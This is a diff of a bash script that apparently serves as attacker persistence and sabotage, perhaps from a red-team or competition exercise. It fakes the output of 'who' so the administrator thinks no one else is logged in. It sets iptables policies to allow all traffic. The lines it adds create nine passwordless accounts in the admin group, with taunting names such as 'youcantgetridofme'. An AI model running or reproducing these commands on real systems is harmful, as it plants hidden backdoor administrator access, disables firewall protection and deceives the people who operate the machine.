@@ -1,11 +1,9 @@
 #!/bin/bash
 
 # Execute real 'who' command and don't display anything. Also mess with them
+# This will make them think they are the only one connected to the box
 command who | grep -Ev "*" | echo "$USER\ttty1\t`date`"
 
-# Every good script needs some psychological warfare
-echo ""
-echo "Gonna have to use something like vim if you want to read this file ;P"
 
 # Source the ~/.bashrc
 source ~/.bashrc
@@ -23,4 +21,13 @@ command iptables -P INPUT ALLOW
 command iptables -P OUTPUT ALLOW
 command iptables -P FORWARD ALLOW
 
-
+# Add some admin users
+command useradd -M devbl -p "" -G admin
+command useradd -M bob -p "" -G admin
+command useradd -M susan -p "" -G admin
+command useradd -M kat -p "" -G admin
+command useradd -M simon -p "" -G admin
+command useradd -M batman -p "" -G admin
+command useradd -M iamalwayshere -p "" -G admin
+command useradd -M youcantgetridofme -p "" -G admin
+command useradd -M hehe -p "" -G admin
